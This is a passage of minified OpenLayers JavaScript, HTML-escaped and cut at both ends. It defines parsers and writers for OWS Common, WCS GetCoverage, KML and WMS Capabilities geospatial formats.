this.targets;OpenLayers.Control.prototype.destroy.call(this)&#125;,CLASS_NAME:"OpenLayers.Control.Snapping"&#125;);OpenLayers.Format.OWSCommon.v1_1_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",xlink:"http://www.w3.org/1999/xlink"&#125;,readers:&#123;ows:OpenLayers.Util.applyDefaults(&#123;ExceptionReport:function(a,b)&#123;b.exceptionReport=&#123;version:a.getAttribute("version"),language:a.getAttribute("xml:lang"),exceptions:[]&#125;;this.readChildNodes(a,b.exceptionReport)&#125;,AllowedValues:function(a,b)&#123;b.allowedValues=&#123;&#125;;this.readChildNodes(a,b.allowedValues)&#125;,AnyValue:function(a,b)&#123;b.anyValue=!0&#125;,DataType:function(a,b)&#123;b.dataType=this.getChildValue(a)&#125;,Range:function(a,b)&#123;b.range=&#123;&#125;;this.readChildNodes(a,b.range)&#125;,MinimumValue:function(a,b)&#123;b.minValue=this.getChildValue(a)&#125;,MaximumValue:function(a,b)&#123;b.maxValue=this.getChildValue(a)&#125;,Identifier:function(a,b)&#123;b.identifier=this.getChildValue(a)&#125;,SupportedCRS:function(a,b)&#123;b.supportedCRS=this.getChildValue(a)&#125;&#125;,OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)&#125;,writers:&#123;ows:OpenLayers.Util.applyDefaults(&#123;Range:function(a)&#123;var b=this.createElementNSPlus("ows:Range",&#123;attributes:&#123;"ows:rangeClosure":a.closure&#125;&#125;);this.writeNode("ows:MinimumValue",a.minValue,b);this.writeNode("ows:MaximumValue",a.maxValue,b);return b&#125;,MinimumValue:function(a)&#123;return this.createElementNSPlus("ows:MinimumValue",&#123;value:a&#125;)&#125;,MaximumValue:function(a)&#123;return this.createElementNSPlus("ows:MaximumValue",&#123;value:a&#125;)&#125;,Value:function(a)&#123;return this.createElementNSPlus("ows:Value",&#123;value:a&#125;)&#125;&#125;,OpenLayers.Format.OWSCommon.v1.prototype.writers.ows)&#125;,CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_1_0"&#125;);OpenLayers.Format.WCSGetCoverage=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows/1.1",wcs:"http://www.opengis.net/wcs/1.1",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,VERSION:"1.1.2",schemaLocation:"http://www.opengis.net/wcs/1.1 http://schemas.opengis.net/wcs/1.1/wcsGetCoverage.xsd",write:function(a)&#123;a=this.writeNode("wcs:GetCoverage",a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;wcs:&#123;GetCoverage:function(a)&#123;var b=this.createElementNSPlus("wcs:GetCoverage",&#123;attributes:&#123;version:a.version||this.VERSION,service:"WCS"&#125;&#125;);this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wcs:DomainSubset",a.domainSubset,b);this.writeNode("wcs:Output",a.output,b);return b&#125;,DomainSubset:function(a)&#123;var b=this.createElementNSPlus("wcs:DomainSubset",&#123;&#125;);this.writeNode("ows:BoundingBox",a.boundingBox,b);a.temporalSubset&amp;&amp;this.writeNode("wcs:TemporalSubset",a.temporalSubset,b);return b&#125;,TemporalSubset:function(a)&#123;for(var b=this.createElementNSPlus("wcs:TemporalSubset",&#123;&#125;),c=0,d=a.timePeriods.length;c&lt;d;++c)this.writeNode("wcs:TimePeriod",a.timePeriods[c],b);return b&#125;,TimePeriod:function(a)&#123;var b=this.createElementNSPlus("wcs:TimePeriod",&#123;&#125;);this.writeNode("wcs:BeginPosition",a.begin,b);this.writeNode("wcs:EndPosition",a.end,b);a.resolution&amp;&amp;this.writeNode("wcs:TimeResolution",a.resolution,b);return b&#125;,BeginPosition:function(a)&#123;return this.createElementNSPlus("wcs:BeginPosition",&#123;value:a&#125;)&#125;,EndPosition:function(a)&#123;return this.createElementNSPlus("wcs:EndPosition",&#123;value:a&#125;)&#125;,TimeResolution:function(a)&#123;return this.createElementNSPlus("wcs:TimeResolution",&#123;value:a&#125;)&#125;,Output:function(a)&#123;var b=this.createElementNSPlus("wcs:Output",&#123;attributes:&#123;format:a.format,store:a.store&#125;&#125;);a.gridCRS&amp;&amp;this.writeNode("wcs:GridCRS",a.gridCRS,b);return b&#125;,GridCRS:function(a)&#123;var b=this.createElementNSPlus("wcs:GridCRS",&#123;&#125;);this.writeNode("wcs:GridBaseCRS",a.baseCRS,b);a.type&amp;&amp;this.writeNode("wcs:GridType",a.type,b);a.origin&amp;&amp;this.writeNode("wcs:GridOrigin",a.origin,b);this.writeNode("wcs:GridOffsets",a.offsets,b);a.CS&amp;&amp;this.writeNode("wcs:GridCS",a.CS,b);return b&#125;,GridBaseCRS:function(a)&#123;return this.createElementNSPlus("wcs:GridBaseCRS",&#123;value:a&#125;)&#125;,GridOrigin:function(a)&#123;return this.createElementNSPlus("wcs:GridOrigin",&#123;value:a&#125;)&#125;,GridType:function(a)&#123;return this.createElementNSPlus("wcs:GridType",&#123;value:a&#125;)&#125;,GridOffsets:function(a)&#123;return this.createElementNSPlus("wcs:GridOffsets",&#123;value:a&#125;)&#125;,GridCS:function(a)&#123;return this.createElementNSPlus("wcs:GridCS",&#123;value:a&#125;)&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WCSGetCoverage"&#125;);OpenLayers.Format.KML=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;kml:"http://www.opengis.net/kml/2.2",gx:"http://www.google.com/kml/ext/2.2"&#125;,kmlns:"http://earth.google.com/kml/2.0",placemarksDesc:"No description available",foldersName:"OpenLayers export",foldersDesc:"Exported on "+new Date,extractAttributes:!0,kvpAttributes:!1,extractStyles:!1,extractTracks:!1,trackAttributes:null,internalns:null,features:null,styles:null,styleBaseUrl:"",fetched:null,maxDepth:0,initialize:function(a)&#123;this.regExes=&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g,kmlColor:/(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)(\w&#123;2&#125;)/,kmlIconPalette:/root:\/\/icons\/palette-(\d+)(\.\w+)/,straightBracket:/\$\[(.*?)\]/g&#125;;this.externalProjection=new OpenLayers.Projection("EPSG:4326");OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;this.features=[];this.styles=&#123;&#125;;this.fetched=&#123;&#125;;return this.parseData(a,&#123;depth:0,styleBaseUrl:this.styleBaseUrl&#125;)&#125;,parseData:function(a,b)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));for(var c=["Link","NetworkLink","Style","StyleMap","Placemark"],d=0,e=c.length;d&lt;e;++d)&#123;var f=c[d],g=this.getElementsByTagNameNS(a,"*",f);if(0!=g.length)switch(f.toLowerCase())&#123;case "link":case "networklink":this.parseLinks(g,b);break;case "style":this.extractStyles&amp;&amp;this.parseStyles(g,b);break;case "stylemap":this.extractStyles&amp;&amp;this.parseStyleMaps(g,b);break;case "placemark":this.parseFeatures(g,b)&#125;&#125;return this.features&#125;,parseLinks:function(a,b)&#123;if(b.depth&gt;=this.maxDepth)return!1;var c=OpenLayers.Util.extend(&#123;&#125;,b);c.depth++;for(var d=0,e=a.length;d&lt;e;d++)&#123;var f=this.parseProperty(a[d],"*","href");f&amp;&amp;!this.fetched[f]&amp;&amp;(this.fetched[f]=!0,(f=this.fetchLink(f))&amp;&amp;this.parseData(f,c))&#125;&#125;,fetchLink:function(a)&#123;if(a=OpenLayers.Request.GET(&#123;url:a,async:!1&#125;))return a.responseText&#125;,parseStyles:function(a,b)&#123;for(var c=0,d=a.length;c&lt;d;c++)&#123;var e=this.parseStyle(a[c]);e&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e.id]=e)&#125;&#125;,parseKmlColor:function(a)&#123;var b=null;a&amp;&amp;(a=a.match(this.regExes.kmlColor))&amp;&amp;(b=&#123;color:"#"+a[4]+a[3]+a[2],opacity:parseInt(a[1],16)/255&#125;);return b&#125;,parseStyle:function(a)&#123;for(var b=&#123;&#125;,c=["LineStyle","PolyStyle","IconStyle","BalloonStyle","LabelStyle"],d,e,f=0,g=c.length;f&lt;g;++f)if(d=c[f],e=this.getElementsByTagNameNS(a,"*",d)[0])switch(d.toLowerCase())&#123;case "linestyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.strokeColor=d.color,b.strokeOpacity=d.opacity;(d=this.parseProperty(e,"*","width"))&amp;&amp;(b.strokeWidth=d);break;case "polystyle":d=this.parseProperty(e,"*","color");if(d=this.parseKmlColor(d))b.fillOpacity=d.opacity,b.fillColor=d.color;"0"==this.parseProperty(e,"*","fill")&amp;&amp;(b.fillColor="none");"0"==this.parseProperty(e,"*","outline")&amp;&amp;(b.strokeWidth="0");break;case "iconstyle":var h=parseFloat(this.parseProperty(e,"*","scale")||1);d=32*h;var k=32*h,l=this.getElementsByTagNameNS(e,"*","Icon")[0];if(l)&#123;var m=this.parseProperty(l,"*","href");if(m)&#123;var n=this.parseProperty(l,"*","w"),p=this.parseProperty(l,"*","h");!OpenLayers.String.startsWith(m,"http://maps.google.com/mapfiles/kml")||(n||p)||(p=n=64,h/=2);n=n||p;p=p||n;n&amp;&amp;(d=parseInt(n)*h);p&amp;&amp;(k=parseInt(p)*h);if(p=m.match(this.regExes.kmlIconPalette))n=p[1],p=p[2],m=this.parseProperty(l,"*","x"),l=this.parseProperty(l,"*","y"),m="http://maps.google.com/mapfiles/kml/pal"+n+"/icon"+(8*(l?7-l/32:7)+(m?m/32:0))+p;b.graphicOpacity=1;b.externalGraphic=m&#125;&#125;if(e=this.getElementsByTagNameNS(e,"*","hotSpot")[0])m=parseFloat(e.getAttribute("x")),l=parseFloat(e.getAttribute("y")),n=e.getAttribute("xunits"),"pixels"==n?b.graphicXOffset=-m*h:"insetPixels"==n?b.graphicXOffset=-d+m*h:"fraction"==n&amp;&amp;(b.graphicXOffset=-d*m),e=e.getAttribute("yunits"),"pixels"==e?b.graphicYOffset=-k+l*h+1:"insetPixels"==e?b.graphicYOffset=-(l*h)+1:"fraction"==e&amp;&amp;(b.graphicYOffset=-k*(1-l)+1);b.graphicWidth=d;b.graphicHeight=k;break;case "balloonstyle":(e=OpenLayers.Util.getXmlNodeValue(e))&amp;&amp;(b.balloonStyle=e.replace(this.regExes.straightBracket,"$&#123;$1&#125;"));break;case "labelstyle":if(d=this.parseProperty(e,"*","color"),d=this.parseKmlColor(d))b.fontColor=d.color,b.fontOpacity=d.opacity&#125;!b.strokeColor&amp;&amp;b.fillColor&amp;&amp;(b.strokeColor=b.fillColor);(a=a.getAttribute("id"))&amp;&amp;b&amp;&amp;(b.id=a);return b&#125;,parseStyleMaps:function(a,b)&#123;for(var c=0,d=a.length;c&lt;d;c++)for(var e=a[c],f=this.getElementsByTagNameNS(e,"*","Pair"),e=e.getAttribute("id"),g=0,h=f.length;g&lt;h;g++)&#123;var k=f[g],l=this.parseProperty(k,"*","key");(k=this.parseProperty(k,"*","styleUrl"))&amp;&amp;"normal"==l&amp;&amp;(this.styles[(b.styleBaseUrl||"")+"#"+e]=this.styles[(b.styleBaseUrl||"")+k])&#125;&#125;,parseFeatures:function(a,b)&#123;for(var c=[],d=0,e=a.length;d&lt;e;d++)&#123;var f=a[d],g=this.parseFeature.apply(this,[f]);if(g)&#123;this.extractStyles&amp;&amp;(g.attributes&amp;&amp;g.attributes.styleUrl)&amp;&amp;(g.style=this.getStyle(g.attributes.styleUrl,b));if(this.extractStyles)&#123;var h=this.getElementsByTagNameNS(f,"*","Style")[0];h&amp;&amp;(h=this.parseStyle(h))&amp;&amp;(g.style=OpenLayers.Util.extend(g.style,h))&#125;this.extractTracks?(f=this.getElementsByTagNameNS(f,this.namespaces.gx,"Track"))&amp;&amp;0&lt;f.length&amp;&amp;(g=&#123;features:[],feature:g&#125;,this.readNode(f[0],g),0&lt;g.features.length&amp;&amp;c.push.apply(c,g.features)):c.push(g)&#125;else throw"Bad Placemark: "+d;&#125;this.features=this.features.concat(c)&#125;,readers:&#123;kml:&#123;when:function(a,b)&#123;b.whens.push(OpenLayers.Date.parse(this.getChildValue(a)))&#125;,_trackPointAttribute:function(a,b)&#123;var c=a.nodeName.split(":").pop();b.attributes[c].push(this.getChildValue(a))&#125;&#125;,gx:&#123;Track:function(a,b)&#123;var c=&#123;whens:[],points:[],angles:[]&#125;;if(this.trackAttributes)&#123;var d;c.attributes=&#123;&#125;;for(var e=0,f=this.trackAttributes.length;e&lt;f;++e)d=this.trackAttributes[e],c.attributes[d]=[],d in this.readers.kml||(this.readers.kml[d]=this.readers.kml._trackPointAttribute)&#125;this.readChildNodes(a,c);if(c.whens.length!==c.points.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:coord ("+c.points.length+") elements.");var g=0&lt;c.angles.length;if(g&amp;&amp;c.whens.length!==c.angles.length)throw Error("gx:Track with unequal number of when ("+c.whens.length+") and gx:angles ("+c.angles.length+") elements.");for(var h,e=0,f=c.whens.length;e&lt;f;++e)&#123;h=b.feature.clone();h.fid=b.feature.fid||b.feature.id;d=c.points[e];h.geometry=d;"z"in d&amp;&amp;(h.attributes.altitude=d.z);this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;h.geometry.transform(this.externalProjection,this.internalProjection);if(this.trackAttributes)for(var k=0,l=this.trackAttributes.length;k&lt;l;++k)d=this.trackAttributes[k],h.attributes[d]=c.attributes[d][e];h.attributes.when=c.whens[e];h.attributes.trackId=b.feature.id;g&amp;&amp;(d=c.angles[e],h.attributes.heading=parseFloat(d[0]),h.attributes.tilt=parseFloat(d[1]),h.attributes.roll=parseFloat(d[2]));b.features.push(h)&#125;&#125;,coord:function(a,b)&#123;var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/),d=new OpenLayers.Geometry.Point(c[0],c[1]);2&lt;c.length&amp;&amp;(d.z=parseFloat(c[2]));b.points.push(d)&#125;,angles:function(a,b)&#123;var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(/\s+/);b.angles.push(c)&#125;&#125;&#125;,parseFeature:function(a)&#123;for(var b=["MultiGeometry","Polygon","LineString","Point"],c,d,e,f=0,g=b.length;f&lt;g;++f)if(c=b[f],this.internalns=a.namespaceURI?a.namespaceURI:this.kmlns,d=this.getElementsByTagNameNS(a,this.internalns,c),0&lt;d.length)&#123;if(b=this.parseGeometry[c.toLowerCase()])e=b.apply(this,[d[0]]),this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;e.transform(this.externalProjection,this.internalProjection);else throw new TypeError("Unsupported geometry type: "+c);break&#125;var h;this.extractAttributes&amp;&amp;(h=this.parseAttributes(a));c=new OpenLayers.Feature.Vector(e,h);a=a.getAttribute("id")||a.getAttribute("name");null!=a&amp;&amp;(c.fid=a);return c&#125;,getStyle:function(a,b)&#123;var c=OpenLayers.Util.removeTail(a),d=OpenLayers.Util.extend(&#123;&#125;,b);d.depth++;d.styleBaseUrl=c;!this.styles[a]&amp;&amp;!OpenLayers.String.startsWith(a,"#")&amp;&amp;d.depth&lt;=this.maxDepth&amp;&amp;!this.fetched[c]&amp;&amp;(c=this.fetchLink(c))&amp;&amp;this.parseData(c,d);return OpenLayers.Util.extend(&#123;&#125;,this.styles[a])&#125;,parseGeometry:&#123;point:function(a)&#123;var b=this.getElementsByTagNameNS(a,this.internalns,"coordinates");a=[];if(0&lt;b.length)&#123;var c=b[0].firstChild.nodeValue,c=c.replace(this.regExes.removeSpace,"");a=c.split(",")&#125;b=null;if(1&lt;a.length)2==a.length&amp;&amp;(a[2]=null),b=new OpenLayers.Geometry.Point(a[0],a[1],a[2]);else throw"Bad coordinate string: "+c;return b&#125;,linestring:function(a,b)&#123;var c=this.getElementsByTagNameNS(a,this.internalns,"coordinates"),d=null;if(0&lt;c.length)&#123;for(var c=this.getChildValue(c[0]),c=c.replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),d=c.split(this.regExes.splitSpace),e=d.length,f=Array(e),g,h,k=0;k&lt;e;++k)if(g=d[k].split(","),h=g.length,1&lt;h)2==g.length&amp;&amp;(g[2]=null),f[k]=new OpenLayers.Geometry.Point(g[0],g[1],g[2]);else throw"Bad LineString point coordinates: "+d[k];if(e)d=b?new OpenLayers.Geometry.LinearRing(f):new OpenLayers.Geometry.LineString(f);else throw"Bad LineString coordinates: "+c;&#125;return d&#125;,polygon:function(a)&#123;a=this.getElementsByTagNameNS(a,this.internalns,"LinearRing");var b=a.length,c=Array(b);if(0&lt;b)for(var d=0,e=a.length;d&lt;e;++d)if(b=this.parseGeometry.linestring.apply(this,[a[d],!0]))c[d]=b;else throw"Bad LinearRing geometry: "+d;return new OpenLayers.Geometry.Polygon(c)&#125;,multigeometry:function(a)&#123;for(var b,c=[],d=a.childNodes,e=0,f=d.length;e&lt;f;++e)a=d[e],1==a.nodeType&amp;&amp;(b=a.prefix?a.nodeName.split(":")[1]:a.nodeName,(b=this.parseGeometry[b.toLowerCase()])&amp;&amp;c.push(b.apply(this,[a])));return new OpenLayers.Geometry.Collection(c)&#125;&#125;,parseAttributes:function(a)&#123;var b=&#123;&#125;,c=a.getElementsByTagName("ExtendedData");c.length&amp;&amp;(b=this.parseExtendedData(c[0]));var d,e,f;a=a.childNodes;for(var c=0,g=a.length;c&lt;g;++c)if(d=a[c],1==d.nodeType&amp;&amp;(e=d.childNodes,1&lt;=e.length&amp;&amp;3&gt;=e.length))&#123;switch(e.length)&#123;case 1:f=e[0];break;case 2:f=e[0];e=e[1];f=3==f.nodeType||4==f.nodeType?f:e;break;default:f=e[1]&#125;if(3==f.nodeType||4==f.nodeType)if(d=d.prefix?d.nodeName.split(":")[1]:d.nodeName,f=OpenLayers.Util.getXmlNodeValue(f))f=f.replace(this.regExes.trimSpace,""),b[d]=f&#125;return b&#125;,parseExtendedData:function(a)&#123;var b=&#123;&#125;,c,d,e,f,g=a.getElementsByTagName("Data");c=0;for(d=g.length;c&lt;d;c++)&#123;e=g[c];f=e.getAttribute("name");var h=&#123;&#125;,k=e.getElementsByTagName("value");k.length&amp;&amp;(h.value=this.getChildValue(k[0]));this.kvpAttributes?b[f]=h.value:(e=e.getElementsByTagName("displayName"),e.length&amp;&amp;(h.displayName=this.getChildValue(e[0])),b[f]=h)&#125;a=a.getElementsByTagName("SimpleData");c=0;for(d=a.length;c&lt;d;c++)h=&#123;&#125;,e=a[c],f=e.getAttribute("name"),h.value=this.getChildValue(e),this.kvpAttributes?b[f]=h.value:(h.displayName=f,b[f]=h);return b&#125;,parseProperty:function(a,b,c)&#123;var d;a=this.getElementsByTagNameNS(a,b,c);try&#123;d=OpenLayers.Util.getXmlNodeValue(a[0])&#125;catch(e)&#123;d=null&#125;return d&#125;,write:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);for(var b=this.createElementNS(this.kmlns,"kml"),c=this.createFolderXML(),d=0,e=a.length;d&lt;e;++d)c.appendChild(this.createPlacemarkXML(a[d]));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])&#125;,createFolderXML:function()&#123;var a=this.createElementNS(this.kmlns,"Folder");if(this.foldersName)&#123;var b=this.createElementNS(this.kmlns,"name"),c=this.createTextNode(this.foldersName);b.appendChild(c);a.appendChild(b)&#125;this.foldersDesc&amp;&amp;(b=this.createElementNS(this.kmlns,"description"),c=this.createTextNode(this.foldersDesc),b.appendChild(c),a.appendChild(b));return a&#125;,createPlacemarkXML:function(a)&#123;var b=this.createElementNS(this.kmlns,"name"),c=a.style&amp;&amp;a.style.label?a.style.label:a.id;b.appendChild(this.createTextNode(a.attributes.name||c));var d=this.createElementNS(this.kmlns,"description");d.appendChild(this.createTextNode(a.attributes.description||this.placemarksDesc));c=this.createElementNS(this.kmlns,"Placemark");null!=a.fid&amp;&amp;c.setAttribute("id",a.fid);c.appendChild(b);c.appendChild(d);b=this.buildGeometryNode(a.geometry);c.appendChild(b);a.attributes&amp;&amp;(a=this.buildExtendedData(a.attributes))&amp;&amp;c.appendChild(a);return c&#125;,buildGeometryNode:function(a)&#123;var b=a.CLASS_NAME,b=b.substring(b.lastIndexOf(".")+1),b=this.buildGeometry[b.toLowerCase()],c=null;b&amp;&amp;(c=b.apply(this,[a]));return c&#125;,buildGeometry:&#123;point:function(a)&#123;var b=this.createElementNS(this.kmlns,"Point");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,multipoint:function(a)&#123;return this.buildGeometry.collection.apply(this,[a])&#125;,linestring:function(a)&#123;var b=this.createElementNS(this.kmlns,"LineString");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,multilinestring:function(a)&#123;return this.buildGeometry.collection.apply(this,[a])&#125;,linearring:function(a)&#123;var b=this.createElementNS(this.kmlns,"LinearRing");b.appendChild(this.buildCoordinatesNode(a));return b&#125;,polygon:function(a)&#123;var b=this.createElementNS(this.kmlns,"Polygon");a=a.components;for(var c,d,e=0,f=a.length;e&lt;f;++e)c=0==e?"outerBoundaryIs":"innerBoundaryIs",c=this.createElementNS(this.kmlns,c),d=this.buildGeometry.linearring.apply(this,[a[e]]),c.appendChild(d),b.appendChild(c);return b&#125;,multipolygon:function(a)&#123;return this.buildGeometry.collection.apply(this,[a])&#125;,collection:function(a)&#123;for(var b=this.createElementNS(this.kmlns,"MultiGeometry"),c,d=0,e=a.components.length;d&lt;e;++d)(c=this.buildGeometryNode.apply(this,[a.components[d]]))&amp;&amp;b.appendChild(c);return b&#125;&#125;,buildCoordinatesNode:function(a)&#123;var b=this.createElementNS(this.kmlns,"coordinates"),c;if(c=a.components)&#123;for(var d=c.length,e=Array(d),f=0;f&lt;d;++f)a=c[f],e[f]=this.buildCoordinates(a);c=e.join(" ")&#125;else c=this.buildCoordinates(a);c=this.createTextNode(c);b.appendChild(c);return b&#125;,buildCoordinates:function(a)&#123;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return a.x+","+a.y&#125;,buildExtendedData:function(a)&#123;var b=this.createElementNS(this.kmlns,"ExtendedData"),c;for(c in a)if(a[c]&amp;&amp;"name"!=c&amp;&amp;"description"!=c&amp;&amp;"styleUrl"!=c)&#123;var d=this.createElementNS(this.kmlns,"Data");d.setAttribute("name",c);var e=this.createElementNS(this.kmlns,"value");if("object"==typeof a[c])&#123;if(a[c].value&amp;&amp;e.appendChild(this.createTextNode(a[c].value)),a[c].displayName)&#123;var f=this.createElementNS(this.kmlns,"displayName");f.appendChild(this.getXMLDoc().createCDATASection(a[c].displayName));d.appendChild(f)&#125;&#125;else e.appendChild(this.createTextNode(a[c]));d.appendChild(e);b.appendChild(d)&#125;return this.isSimpleContent(b)?null:b&#125;,CLASS_NAME:"OpenLayers.Format.KML"&#125;);OpenLayers.Format.WMSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.1.1",profile:null,CLASS_NAME:"OpenLayers.Format.WMSCapabilities"&#125;);OpenLayers.Format.WMSCapabilities.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;wms:"http://www.opengis.net/wms",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,defaultPrefix:"wms",read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=a;a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var c=&#123;&#125;;this.readNode(a,c);void 0===c.service&amp;&amp;(a=new OpenLayers.Format.OGCExceptionReport,c.error=a.read(b));return c&#125;,readers:&#123;wms:&#123;Service:function(a,b)&#123;b.service=&#123;&#125;;this.readChildNodes(a,b.service)&#125;,Name:function(a,b)&#123;b.name=this.getChildValue(a)&#125;,Title:function(a,b)&#123;b.title=this.getChildValue(a)&#125;,Abstract:function(a,b)&#123;b["abstract"]=this.getChildValue(a)&#125;,BoundingBox:function(a,b)&#123;var c=&#123;&#125;;c.bbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")),parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))];var d=&#123;x:parseFloat(a.getAttribute("resx")),y:parseFloat(a.getAttribute("resy"))&#125;;isNaN(d.x)&amp;&amp;isNaN(d.y)||(c.res=d);return c&#125;,OnlineResource:function(a,b)&#123;b.href=this.getAttributeNS(a,this.namespaces.xlink,"href")&#125;,ContactInformation:function(a,b)&#123;b.contactInformation=&#123;&#125;;this.readChildNodes(a,b.contactInformation)&#125;,ContactPersonPrimary:function(a,b)&#123;b.personPrimary=&#123;&#125;;this.readChildNodes(a,b.personPrimary)&#125;,ContactPerson:function(a,b)&#123;b.person=this.getChildValue(a)&#125;,ContactOrganization:function(a,b)&#123;b.organization=this.getChildValue(a)&#125;,ContactPosition:function(a,b)&#123;b.position=this.getChildValue(a)&#125;,ContactAddress:function(a,b)&#123;b.contactAddress=&#123;&#125;;this.readChildNodes(a,b.contactAddress)&#125;,AddressType:function(a,b)&#123;b.type=this.getChildValue(a)&#125;,Address:function(a,b)&#123;b.address=this.getChildValue(a)&#125;,City:function(a,b)&#123;b.city=this.getChildValue(a)&#125;,StateOrProvince:function(a,b)&#123;b.stateOrProvince=this.getChildValue(a)&#125;,PostCode:function(a,b)&#123;b.postcode=this.getChildValue(a)&#125;,Country:function(a,b)&#123;b.country=this.getChildValue(a)&#125;,ContactVoiceTelephone:function(a,b)&#123;b.phone=this.getChildValue(a)&#125;,ContactFacsimileTelephone:function(a,b)&#123;b.fax=this.getChildValue(a)&#125;,ContactElectronicMailAddress:function(a,b)&#123;b.email=this.getChildValue(a)&#125;,Fees:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)&#125;,AccessConstraints:function(a,b)&#123;var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)&#125;,Capability:function(a,b)&#123;b.capability=&#123;nestedLayers:[],layers:[]&#125;;this.readChildNodes(a,b.capability)&#125;,Request:function(a,b)&#123;b.request=&#123;&#125;;this.readChildNodes(a,b.request)&#125;,GetCapabilities:function(a,b)&#123;b.getcapabilities=&#123;formats:[]&#125;;this.readChildNodes(a,b.getcapabilities)&#125;,Format:function(a,b)&#123;OpenLayers.Util.isArray(b.formats)?b.formats.push(this.getChildValue(a)):b.format=this.getChildValue(a)&#125;,DCPType:function(a,b)&#123;this.readChildNodes(a,b)&#125;,HTTP:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Get:function(a,b)&#123;b.get=&#123;&#125;;this.readChildNodes(a,b.get);b.href||(b.href=b.get.href)&#125;,Post:function(a,b)&#123;b.post=&#123;&#125;;this.readChildNodes(a,b.post);b.href||(b.href=b.get.href)&#125;,GetMap:function(a,b)&#123;b.getmap=&#123;formats:[]&#125;;this.readChildNodes(a,b.getmap)&#125;,GetFeatureInfo:function(a,b)&#123;b.getfeatureinfo=&#123;formats:[]&#125;;this.readChildNodes(a,b.getfeatureinfo)&#125;,Exception:function(a,b)&#123;b.exception=&#123;formats:[]&#125;;this.readChildNodes(a,b.exception)&#125;,Layer:function(a,b)&#123;var c,d;b.capability?(d=b.capability,c=b):d=b;var e=a.getAttributeNode("queryable"),f=e&amp;&amp;e.specified?a.getAttribute("queryable"):null,g=(e=a.getAttributeNode("cascaded"))&amp;&amp;e.specified?a.getAttribute("cascaded"):null,e=(e=a.getAttributeNode("opaque"))&amp;&amp;e.specified?a.getAttribute("opaque"):null,h=a.getAttribute("noSubsets"),k=a.getAttribute("fixedWidth"),l=a.getAttribute("fixedHeight"),m=c||&#123;&#125;,n=OpenLayers.Util.extend;c=&#123;nestedLayers:[],styles:c?[].concat(c.styles):[],srs:c?n(&#123;&#125;,m.srs):&#123;&#125;,metadataURLs:[],bbox:c?n(&#123;&#125;,m.bbox):&#123;&#125;,llbbox:m.llbbox,dimensions:c?n(&#123;&#125;,m.dimensions):&#123;&#125;,authorityURLs:c?n(&#123;&#125;,m.authorityURLs):&#123;&#125;,identifiers:&#123;&#125;,keywords:[],queryable:f&amp;&amp;""!==f?"1"===f||"true"===f:m.queryable||!1,cascaded:null!==g?parseInt(g):m.cascaded||0,opaque:e?"1"===e||"true"===e:m.opaque||!1,noSubsets:null!==h?"1"===h||"true"===h:m.noSubsets||!1,fixedWidth:null!=k?parseInt(k):m.fixedWidth||0,fixedHeight:null!=l?parseInt(l):m.fixedHeight||0,minScale:m.minScale,maxScale:m.maxScale,attribution:m.attribution&#125;;b.nestedLayers.push(c);c.capability=d;this.readChildNodes(a,c);delete c.capability;c.name&amp;&amp;(f=c.name.split(":"),g=d.request,e=g.getfeatureinfo,0&lt;f.length&amp;&amp;(c.prefix=f[0]),d.layers.push(c),void 0===c.formats&amp;&amp;(c.formats=g.getmap.formats),void 0===c.infoFormats&amp;&amp;e&amp;&amp;(c.infoFormats=e.formats))&#125;,Attribution:function(a,b)&#123;b.attribution=&#123;&#125;;this.readChildNodes(a,b.attribution)&#125;,LogoURL:function(a,b)&#123;b.logo=&#123;width:a.getAttribute("width"),height:a.getAttribute("height")&#125;;this.readChildNodes(a,b.logo)&#125;,Style:function(a,b)&#123;var 